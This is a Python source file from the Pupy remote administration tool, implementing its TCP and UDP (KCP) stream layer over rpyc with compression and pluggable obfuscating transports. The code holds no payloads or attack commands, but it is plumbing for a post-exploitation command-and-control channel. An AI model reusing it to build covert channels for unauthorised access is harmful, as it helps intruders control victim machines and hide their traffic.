# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
""" abstraction layer over rpyc streams to handle different transports and integrate obfsproxy pluggable transports """

__all__=["PupySocketStream", "PupyUDPSocketStream"]

import sys
from rpyc.core import SocketStream, Connection, Channel
from ..buffer import Buffer
import socket
import time
import errno
import logging
import traceback
import zlib

from rpyc.lib.compat import select, select_error, BYTES_LITERAL, get_exc_errno, maxint
import threading

class addGetPeer(object):
    """ add some functions needed by some obfsproxy transports"""
    def __init__(self, peer):
        self.peer=peer
    def getPeer(self):
        return self.peer

class PupyChannel(Channel):
    def __init__(self, *args, **kwargs):
        super(PupyChannel, self).__init__(*args, **kwargs)
        self.compress = True
        self.COMPRESSION_LEVEL = 5

    def recv(self):
        """ Recv logic with interruptions """

        packet = self.stream.read(self.FRAME_HEADER.size)
        # If no packet - then just return
        if not packet:
            return None

        header = packet

        while len(header) != self.FRAME_HEADER.size:
            packet = self.stream.read(self.FRAME_HEADER.size - len(header))
            if packet:
                header += packet

        length, compressed = self.FRAME_HEADER.unpack(header)

        data = b''
        required_length = length + len(self.FLUSHER)
        while len(data) != required_length:
            packet = self.stream.read(required_length - len(data))
            if packet:
                data += packet

        data = data[:-len(self.FLUSHER)]

        if compressed:
            data = zlib.decompress(data)

        return data

class PupySocketStream(SocketStream):
    def __init__(self, sock, transport_class, transport_kwargs):
        super(PupySocketStream, self).__init__(sock)

        #buffers for streams
        self.buf_in=Buffer()
        self.buf_out=Buffer()
        #buffers for transport
        self.upstream=Buffer(transport_func=addGetPeer(("127.0.0.1", 443)))
        if sock is None:
            peername="127.0.0.1",0
        elif type(sock) is tuple:
            peername=sock[0], sock[1]
        else:
            peername=sock.getpeername()

        self.downstream=Buffer(on_write=self._upstream_recv, transport_func=addGetPeer(peername))

        self.upstream_lock=threading.Lock()
        self.downstream_lock=threading.Lock()

        self.transport=transport_class(self, **transport_kwargs)

        self.MAX_IO_CHUNK=32000
        self.compress = True

        self.on_connect()

    def on_connect(self):
        self.transport.on_connect()
        self._upstream_recv()

    def _read(self):
        try:
            buf = self.sock.recv(self.MAX_IO_CHUNK)
        except socket.timeout:
            return
        except socket.error:
            ex = sys.exc_info()[1]
            if get_exc_errno(ex) in (errno.EAGAIN, errno.EWOULDBLOCK):
                # windows just has to be a b**ch
                # edit: some politeness please ;)
                return
            self.close()
            raise EOFError(ex)
        if not buf:
            self.close()
            raise EOFError("connection closed by peer")

        self.buf_in.write(BYTES_LITERAL(buf))

    # The root of evil
    def poll(self, timeout):
        if self.closed:
            raise EOFError('polling on already closed connection')
        result = ( len(self.upstream)>0 or self.sock_poll(timeout) )
        return result

    def sock_poll(self, timeout):
        with self.downstream_lock:
            to_close = None
            to_read = None

            while not (to_close or to_read or self.closed):
                try:
                    to_read, _, to_close = select([self.sock], [], [self.sock], timeout)
                except select_error as r:
                    if not r.args[0] == errno.EINTR:
                        to_close = True
                    continue

                break

            if to_close:
                raise EOFError('sock_poll error')

            if to_read:
                self._read()
                self.transport.downstream_recv(self.buf_in)
                return True
            else:
                return False

    def _upstream_recv(self):
        """ called as a callback on the downstream.write """
        if len(self.downstream)>0:
            super(PupySocketStream, self).write(self.downstream.read())

    def read(self, count):
        try:
            while len(self.upstream)<count:
                if not self.sock_poll(None) and self.closed:
                    return None

            return self.upstream.read(count)

        except Exception as e:
            logging.debug(traceback.format_exc())
            self.close()

    def write(self, data):
        try:
            with self.upstream_lock:
                self.buf_out.write(data)
                self.transport.upstream_recv(self.buf_out)
            #The write will be done by the _upstream_recv callback on the downstream buffer
        except Exception as e:
            logging.debug(traceback.format_exc())
            self.close()

class PupyUDPSocketStream(object):
    def __init__(self, sock, transport_class, transport_kwargs={}, client_side=True, close_cb=None):
        import kcp

        if not (type(sock) is tuple and len(sock) in (2,3)):
            raise Exception("dst_addr is not supplied for UDP stream, PupyUDPSocketStream needs a reply address/port")

        self.client_side = client_side

        self.sock, self.dst_addr = sock[0], sock[1]
        if len(sock) == 3:
            self.kcp = sock[2]
        else:
            if client_side:
                dst = self.sock.fileno()
            else:
                # dst = lambda data: self.sock.sendto(data, self.dst_addr)
                dst = (
                    self.sock.fileno(), self.sock.family, self.dst_addr[0], self.dst_addr[1]
                )

            self.kcp = kcp.KCP(dst, 0, interval=64)

        self.buf_in=Buffer()
        self.buf_out=Buffer()
        #buffers for transport
        self.upstream = Buffer(transport_func=addGetPeer(("127.0.0.1", 443)))

        self.downstream = Buffer(on_write=self._upstream_recv, transport_func=addGetPeer(self.dst_addr))

        self.upstream_lock = threading.Lock()
        self.downstream_lock = threading.Lock()

        self.transport = transport_class(self, **transport_kwargs)
        self.total_timeout = 0

        self.MAX_IO_CHUNK = self.kcp.mtu - 24
        self.compress = True
        self.close_callback = close_cb

        self.on_connect()

    def update_in(self, last):
        return self.kcp.update_in(last)

    def on_connect(self):
        self.transport.on_connect()
        self._upstream_recv()

    def poll(self, timeout):
        return len(self.upstream)>0 or self._poll_read(timeout)

    def close(self):
        if self.close_callback:
            self.close_callback(self.dst_addr)

        self.closed = True

    def flush(self):
        self.kcp.flush()

    def _upstream_recv(self):
        """ called as a callback on the downstream.write """
        if len(self.downstream)>0:
            data = self.downstream.read()
            self.kcp.send(data)

    def _poll_read(self, timeout=None):
        if not self.client_side:
            # In case of strage hangups change None to timeout
            return self.upstream.wait(None)

        buf = self.kcp.recv()
        if buf is None:
            if timeout is not None:
                timeout = int(timeout) * 1000

            buf = self.kcp.pollread(timeout)

        if buf:
            self.buf_in.write(buf)
            self.total_timeout = 0
            return True

        return False

    def read(self, count):
        try:
            while len(self.upstream) < count:
                with self.downstream_lock:
                    if self.buf_in or self._poll_read(10):
                        self.transport.downstream_recv(self.buf_in)
                    elif not self.client_side:
                        raise ValueError('Method should never be used on server side')

            return self.upstream.read(count)

        except Exception as e:
            logging.debug(traceback.format_exc())


    def write(self, data):
        # The write will be done by the _upstream_recv
        # callback on the downstream buffer

        try:
            with self.upstream_lock:
                while data:
                    data, portion = data[self.MAX_IO_CHUNK:], data[:self.MAX_IO_CHUNK]
                    self.buf_out.write(portion)
                    self.transport.upstream_recv(self.buf_out)

                self.flush()

        except Exception as e:
            logging.debug(traceback.format_exc())

    @property
    def clock(self):
        return self.kcp.clock

    def consume(self):
        with self.downstream_lock:
            while True:
                kcpdata = self.kcp.recv()
                if kcpdata:
                    self.buf_in.write(kcpdata)
                    self.transport.downstream_recv(BYTES_LITERAL(self.buf_in))
                else:
                    break

    def submit(self, data):
        if data:
            with self.downstream_lock:
                self.kcp.submit(data)

            self.consume()

    @property
    def unsent(self):
        return self.kcp.unsent

    def wake(self):
        self.upstream.wake()
